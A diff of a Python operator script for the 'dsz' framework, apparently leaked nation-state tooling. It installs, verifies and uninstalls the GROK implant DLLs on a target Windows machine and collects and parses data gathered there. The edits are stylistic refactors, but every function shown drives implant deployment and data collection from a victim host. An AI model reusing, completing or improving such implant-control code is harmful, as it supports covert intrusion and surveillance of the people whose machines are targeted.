@@ -29,7 +29,7 @@ def grokverify(input):
     else:
         dsz.ui.Echo('tm154o.da storage file missing ... FAILED', dsz.ERROR)
         storageSuccessFlag = False
-    if (storageSuccessFlag == True):
+    if storageSuccessFlag:
         dsz.ui.Echo('GROK should be installed on target... only way to confirm is with DOUBLEFEATURE', dsz.GOOD)
     else:
         dsz.ui.Echo("GROK doesn't look like it is on target... only way to confirm is with DOUBLEFEATURE", dsz.ERROR)
@@ -37,15 +37,15 @@ def grokverify(input):
     return success
 
 def dll_u(dllfile):
-    dsz.ui.Echo(('Executing %s via dll_u' % dllfile))
-    cmd = ('dll_u -library %s' % dllfile)
+    dsz.ui.Echo(f'Executing {dllfile} via dll_u')
+    cmd = f'dll_u -library {dllfile}'
     dsz.control.echo.Off()
     runsuccess = dsz.cmd.Run(cmd)
     dsz.control.echo.On()
     if (not runsuccess):
-        dsz.ui.Echo(('Could not execute %s via dll_u' % dllfile), dsz.ERROR)
+        dsz.ui.Echo(f'Could not execute {dllfile} via dll_u', dsz.ERROR)
         return False
-    dsz.ui.Echo(('Successfully executed %s via dll_u' % dllfile))
+    dsz.ui.Echo(f'Successfully executed {dllfile} via dll_u')
     return True
 
 def getpath():
@@ -85,9 +85,7 @@ def collectfiles():
     runsuccess = dsz.cmd.Run(cmd)
     dsz.control.echo.On()
     success = parsefile(('%s\\GetFiles\\NOSEND\\%s' % (logdir, getfilename)))
-    if (not success):
-        return False
-    return True
+    return bool(success)
 
 def parsefile(file):
     (path, filename) = dsz.path.Split(file)
@@ -106,24 +104,18 @@ def grokparse(input):
         dsz.ui.Echo('No string entered', dsz.ERROR)
         return False
     success = parsefile(fullpath)
-    if (not success):
-        return False
-    return True
+    return bool(success)
 
 def grokinstall(input):
     success = dll_u(('%s\\Uploads\\msgki.dll' % GROK_PATH))
-    if (not success):
-        return False
-    return True
+    return bool(success)
 
 def grokcollect(input):
     success = dll_u(('%s\\Uploads\\msgkd.dll' % GROK_PATH))
     if (not success):
         return False
     success = collectfiles()
-    if (not success):
-        return False
-    return True
+    return bool(success)
 
 def grokuninstall(input):
     success = dll_u(('%s\\Uploads\\msgku.dll' % GROK_PATH))
@@ -146,7 +138,7 @@ def main():
         dsz.ui.Echo('GROK requires a Windows OS', dsz.ERROR)
         return 0
     if (not dsz.version.checks.IsOs64Bit()):
-        dsz.ui.Echo(('GROK %s requires x64' % version), dsz.ERROR)
+        dsz.ui.Echo(f'GROK {version} requires x64', dsz.ERROR)
         return 0
     if dsz.path.windows.GetSystemPath():
         global systemPath
@@ -155,12 +147,14 @@ def main():
         dsz.ui.Echo('Could not find system path', dsz.ERROR)
         return 0
     getpath()
-    menu_list = list()
-    menu_list.append({dsz.menu.Name: 'Install', dsz.menu.Function: grokinstall})
-    menu_list.append({dsz.menu.Name: 'Uninstall', dsz.menu.Function: grokuninstall})
-    menu_list.append({dsz.menu.Name: 'Verify Install', dsz.menu.Function: grokverify})
-    menu_list.append({dsz.menu.Name: 'Collect and Parse', dsz.menu.Function: grokcollect})
-    menu_list.append({dsz.menu.Name: 'Parse Local', dsz.menu.Function: grokparse})
+    menu_list = [
+        {dsz.menu.Name: 'Install', dsz.menu.Function: grokinstall},
+        {dsz.menu.Name: 'Uninstall', dsz.menu.Function: grokuninstall},
+        {dsz.menu.Name: 'Verify Install', dsz.menu.Function: grokverify},
+        {dsz.menu.Name: 'Collect and Parse', dsz.menu.Function: grokcollect},
+        {dsz.menu.Name: 'Parse Local', dsz.menu.Function: grokparse},
+    ]
+
     while (menuOption != (-1)):
         (retvalue, menuOption) = dsz.menu.ExecuteSimpleMenu(('\n\n========================\nGrok %s Menu\n========================\n' % version), menu_list)
         if (menuOption == 0):
@@ -168,17 +162,12 @@ def main():
                 dsz.lp.RecordToolUse(tool, version, 'DEPLOYED', 'Successful')
             if (retvalue == False):
                 dsz.lp.RecordToolUse(tool, version, 'DEPLOYED', 'Unsuccessful')
-        elif (menuOption == 1):
+        elif menuOption == 1:
             if (retvalue == True):
                 dsz.lp.RecordToolUse(tool, version, 'DELETED', 'Successful')
             if (retvalue == False):
                 dsz.lp.RecordToolUse(tool, version, 'DELETED', 'Unsuccessful')
-        elif (menuOption == 2):
-            if (retvalue == True):
-                dsz.lp.RecordToolUse(tool, version, 'EXERCISED', 'Successful')
-            if (retvalue == False):
-                dsz.lp.RecordToolUse(tool, version, 'EXERCISED', 'Unsuccessful')
-        elif (menuOption == 3):
+        elif menuOption in [2, 3]:
             if (retvalue == True):
                 dsz.lp.RecordToolUse(tool, version, 'EXERCISED', 'Successful')
             if (retvalue == False):
